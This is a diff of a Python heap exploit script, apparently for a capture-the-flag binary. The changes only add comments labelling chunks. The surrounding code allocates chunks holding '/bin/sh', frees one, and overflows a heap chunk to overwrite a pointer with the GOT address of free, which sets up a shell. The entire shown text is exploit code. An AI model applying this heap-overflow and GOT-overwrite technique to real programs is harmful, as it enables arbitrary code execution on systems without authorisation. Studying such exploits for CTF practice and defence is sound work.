@@ -97,9 +97,9 @@ if __name__ == "__main__":
     # *g_player_tbl[a1] = GOT of free
     #
 
-    add(24, 'AAAA', 8, '/bin/sh\x00')
-    add(24, 'CCCC', 4, 'DDDD')
-    add(24, 'EEEE', 4, 'FFFF')
+    add(24, 'AAAA', 8, '/bin/sh\x00')           # chunk 0
+    add(24, 'CCCC', 4, 'DDDD')                  # chunk 1
+    add(24, 'EEEE', 4, 'FFFF')                  # chunk 2
     raw_input('after adding items...')
     #delete(0)
     delete(1)
@@ -107,12 +107,12 @@ if __name__ == "__main__":
     raw_input('after deleting the in-between item...')
 
     #
-    # [chunk A-desc] [chunk A-name] [chunk G-desc] [chunk E-desc] [chunk E-name] [chunk G-name]
+    # [chunk 0-desc] [chunk 0-name] [chunk 3-desc] [chunk 2-desc] [chunk 2-name] [chunk 3-name]
     #                                ------------------------------->      
-    #                                            we can overwrite the first 4 bytes of [chunk E-name]
+    #                                            we can overwrite the first 4 bytes of [chunk 2-name]
     #                                            while satisfying (p + len_text >= p2 - 4)                   
     #
-    add(128, 'GGGG', 4, 'HHHH')
+    add(128, 'GGGG', 4, 'HHHH')                 # chunk 3
     raw_input('after adding 1 item...')
     update(3, 168+4, 'X'*168+p32(b.got['free']))
     
